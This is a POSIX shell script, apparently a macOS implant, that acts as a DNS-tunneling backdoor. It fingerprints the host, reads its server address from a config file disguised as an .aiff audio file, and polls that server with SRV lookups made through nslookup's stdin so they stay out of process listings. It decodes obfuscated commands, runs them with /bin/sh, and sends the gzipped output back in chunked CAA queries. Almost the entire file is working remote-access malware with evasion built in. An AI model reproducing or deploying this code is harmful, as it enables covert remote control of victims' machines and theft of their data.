#!/bin/sh
# skiterna
set -u
export LC_ALL=C

# TODO: Use domain names from /etc/resolv.conf

HOSTNAME=$(uname -n)
readonly HOSTNAME

DOMAIN=$(grep "^search" /etc/resolv.conf | cut -d" " -f2)
readonly DOMAIN

# shellcheck disable=SC2046
MAGIC_NUM=$(echo "$HOSTNAME" | cksum | cut -c1-5)
readonly MAGIC_NUM

# shellcheck disable=SC2012
MAGIC_NUM2=$(ls -ld /etc | cksum | cut -c1-2)
readonly MAGIC_NUM2

CLIENT_ID="${MAGIC_NUM}${MAGIC_NUM2}"
readonly CLIENT_ID

SLEEP=1
MAX_SLEEP=1200
readonly MAX_SLEEP
# shellcheck disable=SC2034
MAGIC_WORD="${MAGIC_WORD:-shellack}"
readonly MAGIC_WORD

# This function decodes base64-like data using a custom shell implementation.
# It uses 'dd' for portable single-byte reading and avoids non-standard shell features.
# shellcheck disable=SC2046,SC2086,SC2059,SC2016,SC2162,SC2182,SC3043,SC3006,SC3018,SC3045,SC2182,SC3005
decode_diag() {
    N=0; V=0
    while C=$(dd bs=1 count=1 2>/dev/null) && [ -n "$C" ]; do
        c_val=$(printf '%d' "'$C")
        
        val=-1
        if [ "$c_val" -gt 64 ] && [ "$c_val" -lt 91 ]; then val=$((c_val - 65))
        elif [ "$c_val" -gt 96 ] && [ "$c_val" -lt 123 ]; then val=$((c_val - 71))
        elif [ "$c_val" -gt 47 ] && [ "$c_val" -lt 58 ]; then val=$((c_val + 4))
        elif [ "$c_val" -eq 43 ]; then val=62
        elif [ "$c_val" -eq 47 ]; then val=63
        fi
        
        if [ "$val" -ne -1 ]; then
             V=$(( (V << 6) | val ))
             N=$((N + 1))
             if [ "$N" -eq 4 ]; then
                 b1=$(( (V >> 16) & 255 ))
                 b2=$(( (V >> 8) & 255 ))
                 b3=$(( V & 255 ))
                 printf "\\$(printf '%03o' "$b1")\\$(printf '%03o' "$b2")\\$(printf '%03o' "$b3")"
                 V=0; N=0
             fi
        fi
    done
    
    # Flush remaining bytes
    if [ "$N" -eq 3 ]; then
        b1=$(( (V >> 10) & 255 ))
        b2=$(( (V >> 2) & 255 ))
        printf "\\$(printf '%03o' "$b1")\\$(printf '%03o' "$b2")"
    elif [ "$N" -eq 2 ]; then
        b1=$(( (V >> 4) & 255 ))
        printf "\\$(printf '%03o' "$b1")"
    fi
}

paths="/Library/Preferences/Audio/Data /tmp"
for path in $paths; do
    if [ -w "${path}" ]; then
        _CFG_PATH="${path}/${MAGIC_WORD}.aiff"
    fi
done

# shellcheck disable=SC2002
remote=$(tr 012. .201 < "$_CFG_PATH")

# Parse SERVER_IP and SERVER_PORT from remote
SERVER_PORT=$(echo "${remote}" | cut -d'=' -f2 | cut -d' ' -f1)
SERVER_IP=$(echo "${remote}" | cut -d' ' -f2)

extend_sleep() {
    SLEEP=$((SLEEP * 2))
    if [ "${SLEEP}" -gt "${MAX_SLEEP}" ]; then
        SLEEP="${MAX_SLEEP}"
    fi
}

vendor() {
    if [ -d /System ]; then
        echo "apple"
        return 0
    fi
    echo "unknown"
}


next_cmd() {
    record="${CLIENT_ID}.__$(vendor)__${DOMAIN}_${HOSTNAME}"
    _tmp_kw=$(echo "${record}" | tr '[:upper:]' '[:lower:]' | tr -d '._' | fold -w1 | sort -u | xargs | sed 's/ //g' )
    if [ $? -ne 0 ]; then return 1; fi # Error in kw generation
    kw="$_tmp_kw"
    
    # Use stdin for nslookup to hide the query and server from process args
    _tmp_raw=$(printf "server %s\nset port=%s\nset type=srv\n%s\n" "${SERVER_IP}" "${SERVER_PORT}" "${record}" | nslookup | sed -n 's/.*_loc_/_loc_/p')
    if [ $? -ne 0 ]; then # nslookup or sed failed
        return 1
    fi
    raw="$_tmp_raw"

    if [ "${raw}" = "" ]; then
        return 1
    fi
    _tmp_enc_cmd=$(echo "${raw}" | sed 's/_loc_\.//' | sed 's/\.local\.//' | sed 's/"\/"//g')
    if [ $? -ne 0 ]; then return 1; fi # Error in enc_cmd generation
    enc_cmd="$_tmp_enc_cmd"
    # enc=" $(echo $kw | cut -c1);$(echo $kw | cut -c2-4)|$(echo $kw | cut -c6-8)-$(echo $kw | cut -c9-12)&$(echo $kw | cut -c13-)"
    _tmp_enc="$(echo "$kw" | cut -c1-6) "
    if [ $? -ne 0 ]; then return 1; fi # Error in enc generation
    enc="$_tmp_enc"
    _tmp_dec="$(echo "${enc}" | awk '{ for(i=length($0);i!=0;i--) x=x substr($0,i,1); print x; }' | tail -n1 | tr -d '\n')"
    if [ $? -ne 0 ]; then return 1; fi # Error in dec generation
    dec="$_tmp_dec"
    _tmp_b=$(echo "${enc_cmd}" | sed 's/__/=/g' | tr "${enc}" "${dec}" | tr -cd 'A-Za-z0-9+/=')
    if [ $? -ne 0 ]; then return 1; fi # Error in b generation
    b="$_tmp_b"
    _tmp_cmd=$(echo "$b" | decode_diag)
    if [ $? -ne 0 ]; then return 1; fi # Error in cmd generation
    cmd="$_tmp_cmd"
    _tmp_out=$(/bin/sh -c "${cmd}")
    if [ $? -ne 0 ]; then return 1; fi # Error in command execution
    out="$_tmp_out"
    echo "${out}"
    return 0
}

send_response() {
    pre_split="${TMPDIR:-/tmp}/shellack.$$.tmp"
    echo "${out}" | gzip -c | openssl base64 | tr -d '\n' > "${pre_split}"
    size=$(wc -c < "${pre_split}" | tr -d ' ')
    cd "${TMPDIR}" || exit 1 # SC2164: Use 'cd ... || exit' or 'cd ... || return' in case cd fails. 

    split -b 63 "${pre_split}" "${MAGIC_NUM}."
    chunk_id=0

    for chunk_file in "${MAGIC_NUM}".*; do
        chunk_id=$((chunk_id + 1))
        CAA_RECORD="${MAGIC_NUM}.${size}.$(cat "$chunk_file")"
        _tmp_raw=$(printf "server %s\nset port=%s\nset type=caa\n%s\n" "${SERVER_IP}" "${SERVER_PORT}" "${CAA_RECORD}" | nslookup | sed -n 's/.*_caa_/_caa_/p')
        if [ $? -ne 0 ]; then return 1; fi # Error in raw generation
        raw="$_tmp_raw"
        rm "${chunk_file}"
    done
    rm "${pre_split}"
}

while true; do
    echo "getting next command ..."
    out=$(next_cmd)
    if [ "$?" -ne 0 ]; then
        echo "waiting for next command ..."
        extend_sleep
    else 
        echo "out: ${out}"
        send_response "${out}"
    fi
    sleep "${SLEEP}"
done
